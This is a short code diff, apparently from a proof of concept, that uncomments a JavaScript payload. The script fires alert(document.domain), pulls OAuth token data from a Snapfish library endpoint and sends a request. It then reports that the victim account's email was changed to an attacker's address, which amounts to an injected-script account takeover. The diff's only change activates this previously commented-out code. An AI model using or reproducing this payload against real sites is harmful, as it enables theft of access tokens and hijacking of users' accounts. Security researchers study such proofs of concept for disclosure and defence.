@@ -1,5 +1,5 @@
 alert(document.domain);
-/*
+
 url = "https://www.snapfish.com/library/getOauthInfo"
 access_token = "text.oauthInfo.oa2";
 account_id = "text.oauthInfo.oa2";
@@ -35,4 +35,4 @@ req.onload = function () {
 req.send(null);
 
 setTimeout(() => { alert("Email( "+ account_id +" ) changed to "+ attacker_email );}, 5000);
-*/
+
